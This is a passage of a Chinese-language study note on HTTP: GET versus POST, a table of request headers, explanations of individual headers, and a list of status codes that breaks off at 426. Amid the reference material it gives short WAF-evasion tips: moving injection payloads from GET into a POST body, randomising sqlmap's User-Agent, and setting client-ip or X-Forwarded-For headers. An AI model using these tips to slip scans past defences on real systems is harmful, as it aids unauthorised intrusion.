title="GET和POST的区别"></a>GET和POST的区别</h2><ul><li>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx? name&#x3D;test1&amp;id&#x3D;123456. POST方法是把提交的数据放在HTTP包的Body中。</li><li>GET提交的数据大小有限制，最多只能有1024字节（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。</li></ul><h2 id="http-log"><a href="#http-log" class="headerlink" title="http log"></a>http log</h2><p>做排查的时候 http log 是没有 body 字段的，如果payload在body中就不知道攻击者做了什么，只能拿全流量看，科莱或者其他厂商，开源的也有。</p><h2 id="get、post互转"><a href="#get、post互转" class="headerlink" title="get、post互转"></a>get、post互转</h2><p>比如 <code>http://www.example.com/login.php?username=zhangsan&amp;passwd=123456</code> （<code>?</code> 表示要给<code>login.php</code>传参数了）。</p><p>如果把以上连接复制粘贴到网址栏，默认就会是get请求。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login.php?username=zhangsan&amp;passwd=123456</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br></pre></td></tr></table></figure><p>如果是post请求，参数会出现在body字段中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">......</span><br><span class="line">username=zhangsan&amp;passwd=123456</span><br></pre></td></tr></table></figure><p>如果有些 WAF 拦截get注入包，可以换成post请求，payload放body中。burpsuite中右键有get转post的选项，也有post转get的选项。 </p><h1 id="3-请求标记头"><a href="#3-请求标记头" class="headerlink" title="3 请求标记头"></a>3 请求标记头</h1><table><thead><tr><th align="center">协议头字段名</th><th align="center">说明</th><th align="center">示例</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center">Accept</td><td align="center">能够接受的回应内容类型（Content-Types）</td><td align="center"><code>Accept: text/plain</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Charset</td><td align="center">能够接受的字符集</td><td align="center"><code>Accept-Charset: utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Encoding</td><td align="center">能够接受的编码方式列表。</td><td align="center"><code>Accept-Encoding: gzip, deflate</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Language</td><td align="center">能够接受的回应内容的自然语言列表。</td><td align="center"><code>Accept-Language: en-US</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Datetime</td><td align="center">能够接受的按照时间来表示的版本</td><td align="center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td><td align="center">临时</td></tr><tr><td align="center">Authorization</td><td align="center">用于超文本传输协议的认证的认证信息</td><td align="center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">常设</td></tr><tr><td align="center">Cache-Control</td><td align="center">用来指定在这次的请求&#x2F;响应链中的所有缓存机制 都必须 遵守的指令</td><td align="center"><code>Cache-Control: no-cache</code></td><td align="center">常设</td></tr><tr><td align="center">Connection</td><td align="center">该浏览器想要优先使用的连接类型</td><td align="center"><code>Connection: keep-alive``Connection: Upgrade</code></td><td align="center">常设</td></tr><tr><td align="center">Cookie</td><td align="center">之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie</td><td align="center"><code>Cookie: $Version=1; Skin=new;</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Content-Length</td><td align="center">以 八位字节数组 （8位的字节）表示的请求体的长度</td><td align="center"><code>Content-Length: 348</code></td><td align="center">常设</td></tr><tr><td align="center">Content-MD5</td><td align="center">请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果</td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">过时的[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-9">9]</a></td></tr><tr><td align="center">Content-Type</td><td align="center">请求体的MIME类型 （用于POST和PUT请求中）</td><td align="center"><code>Content-Type: application/x-www-form-urlencoded</code></td><td align="center">常设</td></tr><tr><td align="center">Date</td><td align="center">发送该消息的日期和时间(按照 <code>RFC 7231</code> 中定义的”超文本传输协议日期”格式来发送)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Expect</td><td align="center">表明客户端要求服务器做出特定的行为</td><td align="center"><code>Expect: 100-continue</code></td><td align="center">常设</td></tr><tr><td align="center">From</td><td align="center">发起此请求的用户的邮件地址</td><td align="center"><code>From: user@example.com</code></td><td align="center">常设</td></tr><tr><td align="center">Host</td><td align="center">服务器的域名(用于虚拟主机 )，以及服务器所监听的[传输控制协议)端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。自超文件传输协议版本1.1（<code>HTTP/1.1</code>）开始便是必需字段。</td><td align="center"><code>Host: zh.fsec.io:80``Host: zh.fsec.io</code></td><td align="center">常设</td></tr><tr><td align="center">If-Match</td><td align="center">仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 <code>PUT</code> 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。</td><td align="center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Modified-Since</td><td align="center">允许在对应的内容未被修改的情况下返回304未修改（<code>304 Not Modified</code> ）</td><td align="center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">If-None-Match</td><td align="center">允许在对应的内容未被修改的情况下返回304未修改（ <code>304 Not Modified</code> ），参考 超文本传输协议的实体标记</td><td align="center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Range</td><td align="center">如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体</td><td align="center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Unmodified-Since</td><td align="center">仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。</td><td align="center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Max-Forwards</td><td align="center">限制该消息可被代理及网关转发的次数。</td><td align="center"><code>Max-Forwards: 10</code></td><td align="center">常设</td></tr><tr><td align="center">Origin</td><td align="center">发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制-允许来源’（’<code>Access-Control-Allow-Origin</code>‘）字段）。</td><td align="center"><code>Origin: http://www.example-social-network.com</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Pragma</td><td align="center">与具体的实现相关，这些字段可能在请求&#x2F;回应链中的任何时候产生多种效果。</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">常设但不常用</td></tr><tr><td align="center">Proxy-Authorization</td><td align="center">用来向代理进行认证的认证信息。</td><td align="center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">常设</td></tr><tr><td align="center">Range</td><td align="center">仅请求某个实体的一部分。字节偏移以0开始。参见字节服务。</td><td align="center"><code>Range: bytes=500-999</code></td><td align="center">常设</td></tr><tr><td align="center">Referer</td><td align="center">表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。</td><td align="center"><code>Referer: http://zh.fsec.io/wiki/Main_Page</code></td><td align="center">常设</td></tr><tr><td align="center">TE</td><td align="center">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。</td><td align="center"><code>TE: trailers, deflate</code></td><td align="center">常设</td></tr><tr><td align="center">User-Agent</td><td align="center">浏览器的浏览器身份标识字符串</td><td align="center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td><td align="center">常设</td></tr><tr><td align="center">Upgrade</td><td align="center">要求服务器升级到另一个协议。</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">常设</td></tr><tr><td align="center">Via</td><td align="center">向服务器告知，这个请求是由哪些代理发出的。</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">常设</td></tr><tr><td align="center">Warning</td><td align="center">一个一般性的警告，告知，在实体内容体中可能存在错误。</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">常设</td></tr></tbody></table><h2 id="GET-HTTP-1-1"><a href="#GET-HTTP-1-1" class="headerlink" title="GET &#x2F; HTTP&#x2F;1.1"></a>GET &#x2F; HTTP&#x2F;1.1</h2><p><code>GET</code>：请求方式。</p><p>​    <code>/</code> ：请求的资源，与 Host 中的内容拼接在一起组成完整的url（例：<code>www.123.com/456.html</code> ）。</p><p><code>HTTP/1.1</code>：http协议号。</p><h2 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h2><p>header头中的Host主要是给网站的容器（Apache）分析和dns的，比如说一个站点搭了很多站，都是同一个ip，同一个端口（80），看访问哪个站，用Host域名来区分。</p><h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>用户浏览器的标识。一些WAF会识别出会不会是扫描工具sqlmap等，会拦截。</p><p>sqlmap默认的User-Agent是sqlmap.org</p><p>w3af默认的User-Agent是w3af.org</p><p>扫描的时候最好random-useragent一下，随机生成或调用一些浏览器的正规useragent，sqlmap就有random-useragent参数，防止被WAF识别到。</p><p>client-ip:1.1.1.1</p><p>x-forwarded-for:1.1.1.1</p><p>以上两个都是指定的一些客户端的ip</p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>Content-Length表示正文的长度。</p><p><img src="/img/20220615165014.png"></p><h2 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h2><p>Content-Type表示响应的文档类型。</p><p><img src="/img/20220615165316.png"></p><h2 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h2><p>浏览器端可以接受的MIME类型，客户端能接受的文档类型。</p><h2 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h2><p>浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk等等。</p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>表示请求的来源，包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。提供了Request的上下文信息的服务器，告诉服务器我是从哪个链接过来的，比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p><p>指定你从哪个页面跳转过来了，来源。</p><p>比如要访问某个网站的登录界面，抓到的包头就是</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.123.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...........</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.123.com/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>意思就是从 <code>http://www.123.com/</code> 跳转到 <code>http://www.123.com/login.html</code> 。</p><p>常用来检测csrf攻击，看是否为合法来源。</p><h2 id="Connection-keep-alive"><a href="#Connection-keep-alive" class="headerlink" title="Connection: keep-alive"></a>Connection: keep-alive</h2><p>当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关 闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接。HTTP 1.1默认进行持久连接。利用 持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一 点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入 ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。 </p><h2 id="Connection-close"><a href="#Connection-close" class="headerlink" title="Connection: close"></a>Connection: close</h2><p>代表一个Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭，当客户端 再次发送Request，需要重新建立TCP连接。</p><h2 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h2><p>请求的网页来源。</p><h1 id="4-响应状态码"><a href="#4-响应状态码" class="headerlink" title="4 响应状态码"></a>4 响应状态码</h1><h2 id="1xx-消息"><a href="#1xx-消息" class="headerlink" title="1xx 消息"></a>1xx 消息</h2><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP&#x2F;1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-3">3]</a> 这些状态码代表的响应都是信息性的，标示客户应该等待服务器采取进一步行动。</p><ul><li><p>100 Continue</p><p>服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST请求），或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送<code>Expect: 100-continue</code>作为头部，并在发送正文之前接收<code>100 Continue</code>状态代码。响应代码417期望失败表示请求不应继续。</p></li><li><p>101 Switching Protocols</p><p>服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade消息头中定义的那些协议</p><p>只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本（如HTTP&#x2F;2）比旧版本更有优势，或者切换到一个实时且同步的协议（如WebSocket）以传送利用此类特性的资源。</p></li><li><p>102 Processing（WebDAV RFC 2518）</p><p>WebDAV请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_2518-5">5]</a>这样可以防止客户端超时，并假设请求丢失。</p></li><li><p>103 Early Hints</p><p>用来在最终的HTTP消息之前返回一些响应头。</p></li></ul><h2 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h2><p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。</p><ul><li><p>200 OK</p><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。</p></li><li><p>201 Created</p><p>请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，且其URI已经随Location头信息返回。假如需要的资源无法及时创建的话，应当返回202 Accepted’。</p></li><li><p>202 Accepted</p><p>服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止。</p></li><li><p>203 Non-Authoritative Information（自HTTP &#x2F; 1.1起）</p><p>服务器是一个转换代理服务器（transforming proxy，例如网络加速器），以<code>200 OK</code>状态码为起源，但回应了原始响应的修改版本。</p></li><li><p>204 No Content</p><p>服务器成功处理了请求，没有返回任何内容。在强制门户功能中，Wi-Fi设备连接到需要进行 Web 认证的 Wi-Fi  接入点时，通过访问一个能生成 HTTP 204 响应的的网站，如果能正常收到 204 响应，则代表无需 Web  认证，否则会弹出网页浏览器界面，显示出 Web 网页认证界面用于让用户认证登录。</p></li><li><p>205 Reset Content</p><p>服务器成功处理了请求，但没有返回任何内容。与204响应不同，此响应要求请求者重置文档视图。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-12">12]</a></p></li><li><p>206 Partial Content RFC 7233</p><p>服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</p></li><li><p>207 Multi-Status（WebDAV；RFC 4918</p><p>代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p></li><li><p>208 Already Reported （WebDAV；RFC 5842）</p><p>DAV绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。</p></li><li><p>226 IM Used （RFC 3229）</p><p>服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。</p></li></ul><h2 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h2><p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-iana_status_codes-2">2]</a></p><p>当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A→B→C→……→A或A→A），因为这会导致服务器和客户端大量不必要的资源消耗。按照HTTP&#x2F;1.0版规范的建议，浏览器不应自动访问超过5次的重定向。</p><ul><li><p>300 Multiple Choices</p><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</p><p>除非这是一个HEAD请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。</p><p>如果服务器本身已经有了首选的回馈选择，那么在Location中应当指明这个回馈的<a href="https://zh.wikipedia.org/wiki/URI">URI</a>；浏览器可能会将这个Location值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</p></li><li><p>301 Moved Permanently</p><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</p><p>新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。</p><p>如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p><p>注意：对于某些使用HTTP&#x2F;1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。</p></li><li><p>302 Found</p><p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_1945-19">19]</a>由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。</p><p>新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。</p><p>如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p><p>注意：虽然RFC 1945和RFC  2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</p></li><li><p>303 See Other</p><p>对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT &#x2F;  DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。</p><p>新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。</p><p>注意：许多HTTP&#x2F;1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p></li><li><p>304 Not Modified</p><p>表示资源在由请求头中的If-Modified-Since或If-None-Match参数指定的这一版本之后，未曾被修改。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。</p></li><li><p>305 Use Proxy</p><p>被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建305响应。许多HTTP客户端（像是Mozilla）和Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑。</p><p>注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器创建。忽视这些限制可能导致严重的安全后果。</p></li><li><p>306 Switch Proxy</p><p>在最新版的规范中，306状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。</p></li><li><p>307 Temporary Redirect</p><p>在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。</p></li><li><p>308 Permanent Redirect (RFC 7538)</p><p>请求和所有将来的请求应该使用另一个URI重复。 307和308重复302和301的行为，但不允许HTTP方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行</p></li></ul><h2 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h2><p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。</p><p>如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的[数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p><ul><li><p>400 Bad Request</p><p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。比如说访问某网站http:&#x2F;&#x2F;返回400，加上个s，https:&#x2F;&#x2F;就能访问了。</p></li><li><p>401 Unauthorized RFC 7235</p><p>参见：HTTP基本认证、HTTP摘要认证</p><p>类似于403  Forbidden，401语义即“未认证”，即用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</p><p>注意：当网站（通常是网站域名）禁止IP地址时，有些网站状态码显示的401，表示该特定地址被拒绝访问网站。</p></li><li><p>402 Payment Required</p><p>该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API会使用此状态码。</p></li><li><p>403 Forbidden</p><p>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p></li><li><p>404 Not Found</p><p>请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p></li><li><p>405 Method Not Allowed</p><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过POST呈现数据的表单上的GET请求，或只读资源上的PUT请求。</p><p>鉴于PUT，DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</p></li><li><p>406 Not Acceptable</p><p>参见：内容协商</p><p>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。</p><p>除非这是一个HEAD请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</p></li><li><p>407 Proxy Authentication Required RFC 2617</p><p>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。</p></li><li><p>408 Request Timeout</p><p>请求超时。根据HTTP规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。</p></li><li><p>409 Conflict</p><p>表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突</p></li><li><p>410 Gone</p><p>表示所请求的资源不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到410状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用404状态码。</p></li><li><p>411 Length Required</p><p>服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后，客户端可以再次提交该请求。[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-39">39]</a></p></li><li><p>412 Precondition Failed （RFC 7232）</p><p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p></li><li><p>413 Request Entity Too Large （RFC 7231）</p><p>前称“Request Entity Too Large”，表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p><p>如果这个状况是临时的，服务器应当返回一个Retry-After的响应头，以告知客户端可以在多少时间以后重新尝试。</p></li><li><p>414 Request-URI Too Long（RFC 7231）</p><p>前称“Request-URI Too  Long”，表示请求的URI长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为GET请求的查询字符串，在这种情况下，应将其转换为POST请求。这比较少见，通常的情况包括：本应使用POST方法的表单提交变成了GET方法，导致查询字符串过长。重定向URI“黑洞”，例如每次重定向把旧的URI作为新的URI的一部分，导致在若干次重定向后URI超长。客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的URI，当GET后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回414状态码。</p></li><li><p>415 Unsupported Media Type</p><p>对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为svg，但服务器要求图像使用上传格式为jpg。</p></li><li><p>416 Requested Range Not Satisfiable（RFC 7233）</p><p>前称“Requested Range Not Satisfiable”。客户端已经要求文件的一部分（Byte serving），但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。</p></li><li><p>417 Expectation Failed</p><p>在请求头Expect中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect的内容无法被满足。</p></li><li><p>418 I’m a teapot</p><p>本操作码是在1998年作为IETF的传统愚人节笑话, 在RFC  2324[超文本咖啡壶控制协议中定义的，并不需要在真实的HTTP服务器中定义。当一个控制茶壶的HTCPCP收到BREW或POST指令要求其煮咖啡时应当回传此错误。这个HTTP状态码在某些网站（包括Google.com）与项目（如Node.js、ASP.NET])和[Go语言）中用作彩蛋</p></li><li><p>421 Misdirected Request </p><p>该请求针对的是无法产生响应的服务器（例如因为连接重用）。</p></li><li><p>422 Unprocessable Entity</p><p>请求格式正确，但是由于含有语义错误，无法响应</p></li><li><p>423 Locked</p><p>当前资源被锁定。</p></li><li><p>424 Failed Dependency</p><p>由于之前的某个请求发生的错误，导致当前请求失败，例如PROPPATCH。</p></li><li><p>425 Too Early </p><p>服务器拒绝处理在Early Data中的请求，以规避可能的重放攻击</p></li><li><p>426 Upgrade 